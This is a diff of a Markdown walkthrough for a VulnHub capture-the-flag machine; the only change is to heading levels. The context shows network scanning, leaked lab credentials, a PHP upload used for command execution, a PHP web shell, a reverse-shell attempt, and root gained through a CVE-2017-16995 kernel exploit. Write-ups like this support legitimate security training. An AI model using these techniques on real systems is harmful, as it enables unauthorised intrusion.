@@ -4,9 +4,7 @@
 Available on VulnHub: https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/
 
 
-## Walkthrough
-
-### IP Discovery
+## IP Discovery
 
 ```
 $ sudo netdiscover -r 192.168.1.0/16
@@ -29,7 +27,7 @@ xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
-### Port Scanning
+## Port Scanning
 
 ```
 $ nmap -AT4 -p- 192.168.1.135
@@ -59,7 +57,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 12.81 seconds
 ```
 
-### Web Analysis
+## Web Analysis
 
 ```
 $ nikto -h http://192.168.1.135
@@ -142,7 +140,7 @@ END_TIME: Sat Nov  7 10:04:35 2020
 DOWNLOADED: 13836 - FOUND: 5
 ```
 
-### Flag #1
+## Flag #1
 
 HTTP GET on `http://192.168.1.135/flag/`
 
@@ -150,7 +148,7 @@ HTTP GET on `http://192.168.1.135/flag/`
 The 1st flag is : {8734509128730458630012095}
 ```
 
-### Flag #2
+## Flag #2
 
 Page source code of `http://192.168.1.135/admin_area/`
 
@@ -174,11 +172,11 @@ Flag: **7412574125871236547895214** \
 User: **admin** \
 Pass: **3v1l_H@ck3r**
 
-### WEB Page Login
+## WEB Page Login
 
 Login into `http://192.168.1.135/login.php` page with previously retrieved credentials we found an file uploader page.
 
-### Uploading File Understanding
+## Uploading File Understanding
 
 I created and updated the `index.php` file to run system commands through PHP:
 ```
@@ -198,7 +196,7 @@ RUN IT NOW!
 Linux Jordaninfosec-CTF01 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
-### PHP WEB Shell
+## PHP WEB Shell
 
 To better interact with this RCE I uploaded the `php_web_shell.php` file.\
 It is an PHP WEB Shell based on `https://github.com/andripwn/rce`.\
@@ -241,7 +239,7 @@ It is an PHP WEB Shell based on `https://github.com/andripwn/rce`.\
 </html>
 ```
 
-### Remote Shell
+## Remote Shell
 
 First I attempt to use `netcat` to get a reverse shell, but target's `netcat` doesn't have `-e` option.
 ```
@@ -277,7 +275,7 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-### Privilege Escalation Analysis
+## Privilege Escalation Analysis
 
 Spawning bash
 ```
@@ -445,7 +443,7 @@ cat: write error: Broken pipe
    Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working
 ```
 
-### Exploitation
+## Exploitation
 
 I will attempt to explore the CVE-2017-16995 vulnerability ( https://www.exploit-db.com/exploits/45010 )\
 For that I download and compile the exploit locally.
@@ -482,7 +480,7 @@ www-data@Jordaninfosec-CTF01:/tmp$ ./cve-2017-16995.o
 uid=0(root) gid=0(root) groups=0(root),33(www-data)
 ```
 
-### Flags Acquiring
+## Flags Acquiring
 
 To find where is the other flags, I search in `.bash_history` file.
 ```
@@ -509,7 +507,7 @@ sudo chown www-data:www-data hint.txt
 .
 ```
 
-### Flag #3
+## Flag #3
 
 ```
 # find . | grep hint.txt
@@ -519,7 +517,7 @@ try to find user technawi password to read the flag.txt file, you can find it in
 The 3rd flag is : {7645110034526579012345670}
 ```
 
-### Flag #4
+## Flag #4
 
 ```
 # find . | grep credentials.txt
@@ -533,7 +531,7 @@ password : 3vilH@ksor
 User: **technawi** \
 Pass: **3vilH@ksor**
 
-### Flag #5
+## Flag #5
 
 ```
 # find . | grep flag.txt
